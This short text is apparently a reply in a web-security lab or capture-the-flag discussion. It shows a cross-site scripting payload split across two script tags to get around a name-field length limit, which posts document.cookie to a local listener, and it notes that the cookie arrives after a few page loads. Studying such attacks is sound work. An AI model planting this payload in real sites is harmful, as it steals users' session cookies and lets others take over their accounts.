<SCRIPT>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://localhost:8000", true);</SCRIPT>
<SCRIPT>xhr.send(document.cookie);</SCRIPT>

I think there is a character limit on the name table, you can't send an indefinite stream of characters, you need to break it down into chunks

Just be patient, the cookie comes on it's own after a few refreshes/page navigations.
